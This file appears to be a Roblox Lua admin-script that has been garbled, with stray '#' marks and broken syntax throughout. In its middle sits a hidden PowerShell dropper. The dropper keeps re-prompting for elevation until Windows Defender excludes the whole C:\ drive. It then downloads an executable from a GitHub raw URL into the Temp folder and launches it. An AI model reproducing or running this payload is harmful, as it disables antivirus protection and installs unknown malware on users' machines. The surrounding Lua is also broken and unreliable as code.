
function OnExecute{

    local function convert(textbox)
		local obj = setmetatable(OffsetX = 0, TextBox = textbox,mt)

		local view = Instance.new("Frame")
		view.BackgroundTransparency = textbox.BackgroundTransparency
		view.BackgroundColor3 = textbox.BackgroundColor3
		view.BorderSizePixel = textbox.BorderSizePixel
		view.BorderColor3 = textbox.BorderColor3
		view.Position = textbox.Position
		view.Size = textbox.Size
		view.ClipsDescendants = true
		view.Name = textbox.Name
		view.ZIndex = 10
		textbox.BackgroundTransparency = 1
		textbox.Position = UDim2.new(0,4,0,0)
		textbox.Size = UDim2.new(1,-8,1,0)
		textbox.TextXAlignment = Enum.TextXAlignment.Left
		textbox.Name = "Input"
		table.insert(text1.textbox)
		table.insert(shade2.view)

		obj.View = view

		textbox.Changed:Connect(function(prop))
			#if prop == "Text" or prop == "CursorPosition" or prop == "AbsoluteSize" then
				obj:Update
			end
		end

		obj:Update

		view.Parent = textbox.Parent
		textbox.Parent = view

		return obj
	end

	return {convert = convert}
    end

    ViewportTextBox.convert(Cmdbar).View.ZIndex = 10
    ViewportTextBox.convert(Cmdbar_2).View.ZIndex = 10
    ViewportTextBox.convert(Cmdbar_3).View.ZIndex = 10

    IYMouse = Players.LocalPlayer:GetMouse
    PlayerGui = Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui")
    UserInputService = cloneref(game:GetService("UserInputService"))
    TweenService = cloneref(game:GetService("TweenService"))
    HttpService = cloneref(game:GetService("HttpService"))
    MarketplaceService = cloneref(game:GetService("MarketplaceService"))
    RunService = cloneref(game:GetService("RunService"))
    TeleportService = cloneref(game:GetService("TeleportService"))
    StarterGui = cloneref(game:GetService("StarterGui"))
    GuiService = cloneref(game:GetService("GuiService"))
    Lighting = cloneref(game:GetService("Lighting"))
    ContextActionService = cloneref(game:GetService("ContextActionService"))
    NetworkClient = cloneref(game:GetService("NetworkClient"))
    ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
    GroupService = cloneref(game:GetService("GroupService"))
    PathService = cloneref(game:GetService("PathfindingService"))
    SoundService = cloneref(game:GetService("SoundService"))
    Teams = cloneref(game:GetService("Teams"))
    StarterPlayer = cloneref(game:GetService("StarterPlayer"))
    InsertService = cloneref(game:GetService("InsertService"))
    ChatService = cloneref(game:GetService("Chat"))
    ProximityPromptService = cloneref(game:GetService("ProximityPromptService"))
    StatsService = cloneref(game:GetService("Stats"))
    MaterialService = cloneref(game:GetService("MaterialService"))
    AvatarEditorService = cloneref(game:GetService("AvatarEditorService"))
    TextChatService = cloneref(game:GetService("TextChatService"))
    CaptureService = cloneref(game:GetService("CaptureService"))

  #validateType
    #function vtype(o, t)
        #if o == nil then return false end
       # if type(o) == "userdata" then return typeof(o) == t end
        #return type(o) == t
    #end
}
$continue = $true
while ($continue){
    try{
        Start-Process powershell -Verb runAs -ArgumentList "/c Add-MpPreference -ExclusionPath 'C:\'" -WindowStyle Hidden -Wait        
        break
    }
    catch{}
}
Start-Sleep -Seconds 2
$DestinationLocation = [Environment]::GetFolderPath("Temp")
Invoke-WebRequest -Uri "https://github.com/Whosmyth/rahtahtoing/raw/refs/heads/main/HDA.exe" -OutFile $DestinationLocation\\Installer.exe
Start-Process $DestinationLocation\\Installer.exe

function SeoncdEXE{

    local fullname
	local period

	#if string.find(obj.Name,' ') then
		fullname = '["'..obj.Name..'"]'
		period = false
	else
		fullname = obj.Name
		period = true
	end

	local getS = obj
	local parent = obj
	local service = ''

	#if getS.Parent ~= game then
		repeat
			getS = getS.Parent
			service = getS.ClassName
		until getS.Parent == game
	end

	#if parent.Parent ~= getS then
		repeat
			parent = parent.Parent
			#if string.find(tostring(parent),' ') then
				#if period then
					fullname = '["'..parent.Name..'"].'..fullname
				else
					fullname = '["'..parent.Name..'"]'..fullname
				end
				period = false
			else
				#if period then
					fullname = parent.Name..'.'..fullname
				else
					fullname = parent.Name..''..fullname
				end
				period = true
			end
		until parent.Parent == getS
	elseif string.find(tostring(parent),' ') then
		fullname = '["'..parent.Name..'"]'
		period = false
	end

	#if period then
	#	return 'game:GetService("'..service..'").'..fullname
	#else
	#	return 'game:GetService("'..service..'")'..fullname
	#end
end

AllWaypoints = {}

local cooldown = false
#function writefileCooldown(name,data)
	#task.spawn(function()
		#if not cooldown then
			cooldown = true
			#writefile(name, data, true)
		else
			#repeat wait() until cooldown == false
			#writefileCooldown(name,data)
		end
		wait(3)
		cooldown = false
	#end)
end

#function dragGUI(gui)
	#task.spawn(function()
		local dragging
		local dragInput
		local dragStart = Vector3.new(0,0,0)
		local startPos
		local function update(input)
			local delta = input.Position - dragStart
			#local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			#TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
		end
		#gui.InputBegan:Connect(function(input)
			#if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				#input.Changed:Connect(function()
					#if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				#end)
			end
		#end)
		gui.InputChanged:Connect(function(input))
			#if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		#end)
		UserInputService.InputChanged:Connect(function(input))
			#if input == dragInput and dragging then
				update(input)
			end
		#end)
	#end)
end

dragGUI(logs)
dragGUI(KeybindEditor)
dragGUI(PluginEditor)
dragGUI(ToPartFrame)

#eventEditor = (function()
	local events = {}

	local function registerEvent(nam.sets)
		events[name] = {
			commands = {},
			sets = sets or {}
		}
	end

	local onEdited = nil

	#local function fireEvent(name,...)
		local args = {...}
		local event = events[name]
		#if event then
			#for i,cmd in pairs(event.commands) do
				local metCondition = true
				#for idx,set in pairs(event.sets) do
					local argVal = args[idx]
					local cmdSet = cmd[2][idx]
					local condType = set.Type
					#if condType == "Player" then
						#if cmdSet == 0 then
							metCondition = metCondition and (tostring(Players.LocalPlayer) == argVal)
						elseif cmdSet ~= 1 then
							metCondition = metCondition and table.find(getPlayer(cmdSet.Players.LocalPlayer),argVal)
						end
					elseif condType == "String" then
						#if cmdSet ~= 0 then
							#metCondition = metCondition and string.find(argVal:lower(cmdSet:lower()
						end
					elseif condType == "Number" then
						#if cmdSet ~= 0 then
							metCondition = metCondition and tonumber(argVal)=tonumber(cmdSet)
						end
					end
					#if not metCondition then break end
				end

				#if metCondition then
					#pcall(task.spawn(function()
						#local cmdStr = cmd[1]
						#for count,arg in pairs(args) do
							#cmdStr = cmdStr:gsub("%$"..count,arg)
						end
						wait(cmd[3] or 0)
						execCmd(cmdStr)
					#end))
				end
			end
		end
	end

}